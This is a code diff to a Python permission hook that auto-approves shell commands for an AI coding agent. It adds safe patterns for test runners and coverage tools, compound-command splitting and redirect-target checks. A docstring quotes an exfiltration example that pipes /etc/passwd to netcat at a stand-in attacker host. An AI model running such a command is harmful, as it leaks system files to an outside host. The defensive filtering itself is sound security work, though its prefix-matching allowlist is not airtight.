@@ -81,6 +81,15 @@ SAFE_PATTERNS.add(
 # Make targets that are typically safe
 SAFE_PATTERNS.add("make_safe", r"^make\s+(test|lint|check|fmt|format)$", re.IGNORECASE)
 
+# Modern JavaScript/TypeScript test runners
+SAFE_PATTERNS.add("vitest", r"^(npx\s+)?vitest\b", re.IGNORECASE)
+SAFE_PATTERNS.add("bun_test", r"^bun\s+test\b", re.IGNORECASE)
+SAFE_PATTERNS.add("deno_test", r"^deno\s+test\b", re.IGNORECASE)
+
+# Coverage tools
+SAFE_PATTERNS.add("coverage", r"^coverage\s+(run|report|html|xml|json|combine|erase)", re.IGNORECASE)
+SAFE_PATTERNS.add("codecov", r"^codecov\b", re.IGNORECASE)
+
 # Shell utilities for inspection (readonly)
 SAFE_PATTERNS.add("ls_cmd", r"^ls\b", re.IGNORECASE)
 SAFE_PATTERNS.add("cat_cmd", r"^cat\b", re.IGNORECASE)
@@ -105,6 +114,11 @@ SAFE_PATTERN_NAMES = [
     "cargo",
     "git_readonly",
     "make_safe",
+    "vitest",
+    "bun_test",
+    "deno_test",
+    "coverage",
+    "codecov",
     "ls_cmd",
     "cat_cmd",
     "head_tail",
@@ -120,7 +134,92 @@ def has_shell_operators(command: str) -> bool:
     Security fix: prevents auto-approving commands like 'cat /etc/passwd | nc evil.com'.
     Simple heuristic - looks for unquoted shell operators.
     """
-    return bool(re.search(r'[|><]|&&', command))
+    return bool(re.search(r'[|><;&`()]', command))
+
+
+def split_compound_command(command: str) -> list[str] | None:
+    """Split command on && and || operators, respecting quotes.
+
+    Returns list of sub-commands, or None if command contains
+    bare pipes (| not part of ||) which are unsafe.
+    """
+    parts: list[str] = []
+    current: list[str] = []
+    in_single = False
+    in_double = False
+    i = 0
+
+    while i < len(command):
+        c = command[i]
+
+        if c == "'" and not in_double:
+            in_single = not in_single
+            current.append(c)
+        elif c == '"' and not in_single:
+            in_double = not in_double
+            current.append(c)
+        elif not in_single and not in_double:
+            if c == '|':
+                if i + 1 < len(command) and command[i + 1] == '|':
+                    # || operator — split here
+                    parts.append(''.join(current).strip())
+                    current = []
+                    i += 2
+                    continue
+                else:
+                    # Bare pipe — unsafe
+                    return None
+            elif c == '&' and i + 1 < len(command) and command[i + 1] == '&':
+                # && operator — split here
+                parts.append(''.join(current).strip())
+                current = []
+                i += 2
+                continue
+            elif c == '&':
+                # Bare & (background operator) — unsafe
+                return None
+            elif c in (';', '`', '(', ')'):
+                # Semicolons, backticks, subshells — unsafe
+                return None
+            else:
+                current.append(c)
+        else:
+            current.append(c)
+
+        i += 1
+
+    remaining = ''.join(current).strip()
+    if remaining:
+        parts.append(remaining)
+
+    return [p for p in parts if p]
+
+
+def check_redirect_safety(subcmd: str) -> bool:
+    """Check if output redirects in a sub-command target safe project paths.
+
+    For > and >>: extracts target path and verifies is_path_in_project().
+    For < (input redirect): rejects as unsafe.
+    """
+    # Reject input redirects
+    if re.search(r'<', subcmd):
+        log_debug("input redirect found - unsafe")
+        return False
+
+    # Check ALL output redirects (>> or >)
+    for redirect_match in re.finditer(r'(>>?)\s*(\S+)', subcmd):
+        target_path = redirect_match.group(2).strip("'\"")
+        if not is_path_in_project(target_path):
+            log_debug(f"redirect target {target_path} is outside project - unsafe")
+            return False
+        log_debug(f"redirect target {target_path} is within project - safe")
+
+    return True  # All redirects safe (or no redirects)
+
+
+def strip_redirect(subcmd: str) -> str:
+    """Remove redirect portion from a sub-command for pattern matching."""
+    return re.sub(r'\s*>>?\s*\S+', '', subcmd).strip()
 
 
 def is_plugin_internal_script(command: str) -> bool:
@@ -250,9 +349,21 @@ def is_safe_read_tool(tool_name: str, tool_input: dict | str) -> tuple[bool, str
     return False, None
 
 
+def _match_safe_pattern(cmd: str) -> str | None:
+    """Check if a single command matches any safe pattern. Returns pattern name or None."""
+    for pattern_name in SAFE_PATTERN_NAMES:
+        if SAFE_PATTERNS.match(pattern_name, cmd):
+            return pattern_name
+    return None
+
+
 def is_safe_command(command: str) -> tuple[bool, str | None]:
     """
     Check if a command matches any safe pattern.
+
+    Supports compound commands (&&, ||) by checking each sub-command
+    independently. Bare pipes are rejected. Output redirects (>, >>)
+    are allowed only if the target path is within the project.
 
     Args:
         command: The bash command to check.
@@ -266,15 +377,37 @@ def is_safe_command(command: str) -> tuple[bool, str | None]:
     if is_plugin_internal_script(command):
         return True, "plugin_internal_script"
 
-    for pattern_name in SAFE_PATTERN_NAMES:
-        if SAFE_PATTERNS.match(pattern_name, command):
-            # Security: reject commands with pipes/redirects even if base command is safe
-            if has_shell_operators(command):
-                log_debug(f"command matched {pattern_name} but contains shell operators - deferring")
-                return False, None
-            log_debug(f"command matched safe pattern: {pattern_name}")
-            return True, pattern_name
-    return False, None
+    # Simple command (no shell operators)
+    if not has_shell_operators(command):
+        pattern = _match_safe_pattern(command)
+        if pattern:
+            log_debug(f"command matched safe pattern: {pattern}")
+            return True, pattern
+        return False, None
+
+    # Compound command — split on && and || (bare pipes rejected)
+    subcmds = split_compound_command(command)
+    if subcmds is None:
+        log_debug("command contains bare pipe - deferring to user")
+        return False, None
+
+    # Check each sub-command independently
+    for subcmd in subcmds:
+        # Verify redirect targets are within project
+        if not check_redirect_safety(subcmd):
+            log_debug(f"sub-command has unsafe redirect: {subcmd}")
+            return False, None
+
+        # Strip redirect for pattern matching
+        base_cmd = strip_redirect(subcmd)
+
+        pattern = _match_safe_pattern(base_cmd)
+        if not pattern:
+            log_debug(f"sub-command not in safe list: {base_cmd}")
+            return False, None
+
+    log_debug("all sub-commands in compound command are safe")
+    return True, "compound_safe"
 
 
 @hook_main("PermissionRequest")
